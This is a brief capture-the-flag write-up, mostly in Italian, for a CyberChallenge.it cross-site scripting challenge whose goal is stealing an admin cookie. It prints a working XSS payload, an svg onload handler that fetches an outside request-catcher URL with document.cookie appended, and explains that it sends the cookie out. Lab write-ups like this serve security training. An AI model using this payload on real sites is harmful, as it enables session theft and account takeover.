@@ -1,0 +1,15 @@
+Descrizione:
+Welcome to a series of 4 challenges about XSS: fifth level!
+Goal: get the admin cookie!
+You can report an url to the admin big using the form in the header.
+Website: http://xss5.challs.cyberchallenge.it/ 
+
+
+Solve:
+Serie di 4 challenge riguardanti attacchi di tipo xss, la difficolta' delle challenge aumenta con l'introduzione di controlli sempre piu' stringenti.
+Il sito si presenta con una casella di testo centrale dove e' possibile fare le query e una casella in alto dove possiamo fare un report ad un url da noi inserito che verra' visitato automaticamente dal sito.
+Il tag seguente funziona per tutte e 4 le challenge della serie: 
+<svg onload="fetch('https://test.requestcatcher.com/test'+document.cookie)";>
+
+Sfruttando javascript all'interno di un tag svg prende i cookie dell admin e li invia ad un link request catcher da dove noi possiamo leggere le richieste che vengono effettuate, riceveremo una richiesta get con la flag
+
